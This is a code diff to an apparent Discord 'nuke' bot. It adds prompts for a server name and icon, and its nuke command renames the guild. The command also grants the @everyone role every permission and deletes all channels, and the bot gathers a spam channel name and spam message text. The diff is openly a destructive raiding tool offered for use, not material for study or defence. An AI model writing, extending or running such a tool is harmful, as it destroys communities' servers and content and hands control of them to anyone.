@@ -22,6 +22,8 @@ spam_channel_name = input(f"{df_color}[+] {df_yellow}Spam Channel Name: " + Fore
 spam_message_text = input(f"{df_color}[+] {df_yellow}Spam Message Text: " + Fore.RESET)
 
 role_name = input(f"{df_color}[+] {df_yellow}Role Name: " + Fore.RESET)
+server_name_change = input(f"{df_color}[+] {df_yellow}Server Name: " + Fore.RESET)
+server_icon_change = input(f"{df_color}[+] {df_yellow}Server Icon: " + Fore.RESET)
 
 
 os.system('cls')
@@ -55,6 +57,7 @@ async def stop(ctx):
     await ctx.message.delete()
     await ctx.bot.logout()
     print(Fore.GREEN + f"{df_color}[+]{df_yellow} {client.user.name} has logged out successfully." + Fore.RESET)
+    
 
 @client.command()
 async def nuke(ctx):
@@ -62,10 +65,11 @@ async def nuke(ctx):
     guild = ctx.guild
     try:
       role = discord.utils.get(guild.roles, name = "@everyone")
+      await ctx.guild.edit(name=server_name_change)
       await role.edit(permissions = Permissions.all())
-      print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Admin  | everyone" + Fore.RESET)
+      print(f"{df_color}[+]{granted} GRANTED {df_yellow}| Admin  | @everyone" + Fore.RESET)
     except:
-      print(f"{df_color}[+]{denied} DENIED  {df_yellow}| Admin  | everyone" + Fore.RESET)
+      print(f"{df_color}[+]{denied} DENIED  {df_yellow}| Admin  | @everyone" + Fore.RESET)
     for channel in guild.channels:
       try:
         await channel.delete()
